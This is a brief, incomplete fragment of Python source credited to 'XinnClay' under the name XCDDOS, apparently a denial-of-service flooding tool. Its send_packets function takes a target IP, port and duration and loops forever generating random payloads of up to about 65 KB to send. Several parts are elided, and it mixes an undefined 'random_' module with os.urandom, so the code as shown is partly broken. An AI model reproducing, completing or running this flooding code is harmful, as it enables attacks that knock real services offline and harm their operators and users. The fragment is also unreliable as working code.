# Created By XinnClay FIXXED / XCDDOS
...
def send_packets(ip, port, time, packet_size):
    ...
    while True:
        try:
            nulled = b""
            data = random_.urandom(int(random.randint(500, 1024)))
            data2 = random_.urandom(int(random.randint(1025, 65505)))
            data3 = os.urandom(int(random.randint(1025, 65505)))
            data4 = random_.urandom(int(random.randint(1, 65505)))
